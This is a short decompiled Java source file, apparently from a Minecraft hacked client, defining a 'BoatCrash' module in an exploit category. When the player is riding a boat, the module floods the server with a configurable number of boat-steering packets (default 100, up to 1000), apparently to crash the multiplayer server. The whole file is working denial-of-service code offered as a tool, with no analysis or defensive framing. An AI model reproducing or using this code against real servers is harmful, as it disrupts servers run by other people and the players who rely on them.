//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.*;
import cc.candy.candymod.setting.*;
import net.minecraft.entity.item.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import net.minecraft.entity.*;

public class BoatCrash extends Module
{
    public Setting<Integer> amount;
    
    public BoatCrash() {
        super("BoatCrash", Categories.EXPLOIT, false, false);
        this.amount = (Setting<Integer>)this.register(new Setting("Amount", (T)100, (T)1000, (T)1));
    }
    
    @Override
    public void onEnable() {
        if (this.nullCheck()) {
            return;
        }
        final Entity e = BoatCrash.mc.player.getRidingEntity();
        if (!(e instanceof EntityBoat)) {
            this.sendMessage("You are not riding boat! disabling");
            this.disable();
            return;
        }
        for (int i = 0; i < this.amount.getValue(); ++i) {
            BoatCrash.mc.player.connection.sendPacket((Packet)new CPacketSteerBoat(true, true));
        }
    }
}
